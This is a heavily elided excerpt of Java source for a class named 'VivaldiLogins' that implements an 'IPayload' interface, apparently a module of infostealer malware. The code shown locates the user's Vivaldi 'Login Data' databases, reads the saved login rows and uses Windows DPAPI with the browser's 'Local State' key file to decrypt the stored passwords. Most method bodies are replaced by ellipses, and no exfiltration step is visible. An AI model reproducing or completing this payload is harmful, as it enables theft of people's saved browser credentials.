...
public class VivaldiLogins implements IPayload
{
    ...
    public void run() {
        ...
        try {
            ...
            final ArrayList<String> list = getVivaldiInfo();
    ...
    public static ArrayList<String> getVivaldiInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Vivaldi\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && VivaldiLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)VivaldiLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(VivaldiLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Vivaldi\\User Data\\Local State";
        VivaldiLogins.shorten = true;
        VivaldiLogins.obfus = false;
    }
}
